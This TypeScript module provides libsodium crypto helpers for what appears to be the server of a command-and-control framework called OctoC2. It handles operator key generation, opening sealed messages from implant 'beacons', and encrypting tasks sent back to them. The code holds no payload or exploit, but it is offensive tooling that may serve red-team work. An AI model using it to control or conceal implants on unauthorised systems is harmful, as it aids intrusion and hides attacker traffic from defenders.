/**
 * OctoC2 Server — Crypto helpers (libsodium)
 *
 * Mirrors the implant's crypto/sodium.ts but oriented toward the server's
 * role: the server is always the recipient of sealed messages (it holds
 * operatorSecretKey) and the sender of encrypted task deliveries.
 *
 * Same Bun ESM workaround as the implant: createRequire forces CJS loading
 * of libsodium-wrappers to avoid the broken .mjs entrypoint in v0.7.x.
 */

import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

let ready = false;
async function getSodium() {
  if (!ready) {
    await _sodium.ready;
    ready = true;
  }
  return _sodium;
}

// ── Key generation (used by octoctl keygen) ───────────────────────────────────

export async function generateOperatorKeyPair(): Promise<{
  publicKey: Uint8Array;
  secretKey: Uint8Array;
}> {
  const sodium = await getSodium();
  const kp = sodium.crypto_box_keypair();
  return { publicKey: kp.publicKey, secretKey: kp.privateKey };
}

// ── Open sealed box (primary server operation) ────────────────────────────────
//
// All beacon→server messages use crypto_box_seal. The server decrypts them
// with its own public+secret key pair (operator key pair).

export async function openSealBox(
  sealedB64: string,
  operatorPublicKey: Uint8Array,
  operatorSecretKey: Uint8Array
): Promise<Uint8Array> {
  const sodium = await getSodium();
  const sealed = sodium.from_base64(sealedB64, _sodium.base64_variants.URLSAFE_NO_PADDING);
  const plain  = sodium.crypto_box_seal_open(sealed, operatorPublicKey, operatorSecretKey);
  if (!plain) throw new Error("[Server/Crypto] Seal open failed — wrong key or corrupted data");
  return plain;
}

// ── Seal box (anonymous encryption, server → beacon or test helpers) ──────────
//
// Used when the sender identity does not need to be authenticated.
// Beacon → server result delivery uses crypto_box_seal so the server
// can decrypt with its operator key pair.

export async function sealBox(
  message: Uint8Array | string,
  recipientPublicKey: Uint8Array
): Promise<string> {
  const sodium = await getSodium();
  const msg = typeof message === "string" ? sodium.from_string(message) : message;
  const sealed = sodium.crypto_box_seal(msg, recipientPublicKey);
  return sodium.to_base64(sealed, _sodium.base64_variants.URLSAFE_NO_PADDING);
}

// ── Encrypt task delivery (server → beacon) ───────────────────────────────────
//
// Encrypted with crypto_box so the beacon can authenticate the sender
// (only the operator, who holds operatorSecretKey, could have sent this).

export async function encryptForBeacon(
  plaintext: string | Uint8Array,
  beaconPublicKey: Uint8Array,
  operatorSecretKey: Uint8Array
): Promise<{ nonce: string; ciphertext: string }> {
  const sodium = await getSodium();

  const msg =
    typeof plaintext === "string" ? sodium.from_string(plaintext) : plaintext;

  const nonce      = sodium.randombytes_buf(sodium.crypto_box_NONCEBYTES);
  const ciphertext = sodium.crypto_box_easy(msg, nonce, beaconPublicKey, operatorSecretKey);

  return {
    nonce:      sodium.to_base64(nonce,      _sodium.base64_variants.URLSAFE_NO_PADDING),
    ciphertext: sodium.to_base64(ciphertext, _sodium.base64_variants.URLSAFE_NO_PADDING),
  };
}

// ── Helpers ───────────────────────────────────────────────────────────────────

export async function bytesToBase64(bytes: Uint8Array): Promise<string> {
  const sodium = await getSodium();
  return sodium.to_base64(bytes, _sodium.base64_variants.URLSAFE_NO_PADDING);
}

export async function base64ToBytes(b64: string): Promise<Uint8Array> {
  const sodium = await getSodium();
  return sodium.from_base64(b64.trim(), _sodium.base64_variants.URLSAFE_NO_PADDING);
}

export function bytesToString(bytes: Uint8Array): string {
  return new TextDecoder().decode(bytes);
}
